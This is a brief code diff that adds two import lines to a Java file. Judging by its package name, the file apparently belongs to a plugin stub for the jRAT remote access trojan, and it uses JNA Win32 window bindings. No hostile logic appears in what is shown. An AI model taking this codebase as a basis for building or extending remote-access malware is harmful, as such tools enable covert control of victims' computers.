@@ -1,5 +1,8 @@
 package pro.jrat.plugin.stub;
 
+import pro.jrat.plugin.stub.activities.Activities;
+import pro.jrat.plugin.stub.activities.Title;
+
 import com.sun.jna.Native;
 import com.sun.jna.Pointer;
 import com.sun.jna.platform.win32.WinDef.HWND;
